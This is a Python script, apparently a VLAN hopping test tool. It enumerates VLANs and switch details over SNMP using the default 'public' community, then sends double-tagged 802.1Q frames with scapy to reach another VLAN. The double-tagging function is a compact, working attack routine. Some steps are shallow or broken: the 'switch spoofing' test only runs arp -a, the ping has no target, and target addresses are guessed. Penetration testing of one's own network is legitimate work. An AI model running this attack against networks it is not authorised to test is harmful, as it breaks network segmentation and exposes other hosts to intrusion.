#Requires scapy and pysnmp / runs with sudo python3 vlan_hopping_linux_snmp.py


import os
import subprocess
from scapy.all import Ether, Dot1Q, IP, ICMP, sendp
from pysnmp.hlapi import *

def get_vlan_ids(switch_ip, community='public'):
    vlan_ids = []
    iterator = nextCmd(
        SnmpEngine(),
        CommunityData(community, mpModel=0),
        UdpTransportTarget((switch_ip, 161)),
        ContextData(),
        ObjectType(ObjectIdentity('1.3.6.1.2.1.17.7.1.4.3.1.1'))
    )

    for errorIndication, errorStatus, errorIndex, varBinds in iterator:
        if errorIndication:
            print(errorIndication)
            break
        elif errorStatus:
            print('%s at %s' % (errorStatus.prettyPrint(),
                                errorIndex and varBinds[int(errorIndex) - 1][0] or '?'))
            break
        else:
            for varBind in varBinds:
                vlan_id = int(varBind[0][-1])
                vlan_ids.append(vlan_id)
    return vlan_ids

def double_tagging_attack(src_vlan, target_vlan, target_ip):
    pkt = Ether()/Dot1Q(vlan=src_vlan)/Dot1Q(vlan=target_vlan)/IP(dst=target_ip)/ICMP()
    sendp(pkt, iface="eth0")
    print(f"Double tagging attack from VLAN {src_vlan} to VLAN {target_vlan} sent to {target_ip}")

def vlan_hopping_test_linux(switch_ip, community='public'):
    print("Running VLAN hopping test on Linux...")

    # Detect VLAN IDs
    vlan_ids = get_vlan_ids(switch_ip, community)
    if len(vlan_ids) < 2:
        print("Insufficient VLANs detected for testing.")
        return

    vlan_id1, vlan_id2 = vlan_ids[:2]

    # Switch Spoofing Test
    print("Switch Spoofing Test:")
    subprocess.run(['arp', '-a'])

    # Double Tagging Test
    target_ip = f'192.168.{vlan_id2}.1'  # Example target IP
    print(f"Double Tagging Test (VLAN {vlan_id1} -> VLAN {vlan_id2}):")
    subprocess.run(['ping', '-I', f'192.168.{vlan_id1}.1', '-c', '4'])
    double_tagging_attack(vlan_id1, vlan_id2, target_ip)

    # SNMP Information Gathering
    print("SNMP Information Gathering:")
    oids = {
        'sysDescr': '1.3.6.1.2.1.1.1.0',
        'sysObjectID': '1.3.6.1.2.1.1.2.0',
        'sysName': '1.3.6.1.2.1.1.5.0'
    }
    
    results = {}
    for key, oid in oids.items():
        iterator = getCmd(
            SnmpEngine(),
            CommunityData(community, mpModel=0),
            UdpTransportTarget((switch_ip, 161)),
            ContextData(),
            ObjectType(ObjectIdentity(oid))
        )
        
        for errorIndication, errorStatus, errorIndex, varBinds in iterator:
            if errorIndication:
                print(errorIndication)
                break
            elif errorStatus:
                print('%s at %s' % (errorStatus.prettyPrint(),
                                    errorIndex and varBinds[int(errorIndex) - 1][0] or '?'))
                break
            else:
                for varBind in varBinds:
                    results[key] = ' = '.join([x.prettyPrint() for x in varBind])

    for key, result in results.items():
        print(f"{key}: {result}")

    # Recommend actions based on detected switch type
    if 'sysObjectID' in results and 'Cisco' in results['sysObjectID']:
        print("Recommended Action: Review Cisco switch configuration and ensure proper VLAN isolation.")
    elif 'sysObjectID' in results and 'Juniper' in results['sysObjectID']:
        print("Recommended Action: Review Juniper switch configuration and ensure proper VLAN isolation.")
    else:
        print("Recommended Action: Review switch configuration and ensure proper VLAN isolation.")

if __name__ == "__main__":
    switch_ip = "192.168.10.1"  # Replace with your switch IP
    vlan_hopping_test_linux(switch_ip)
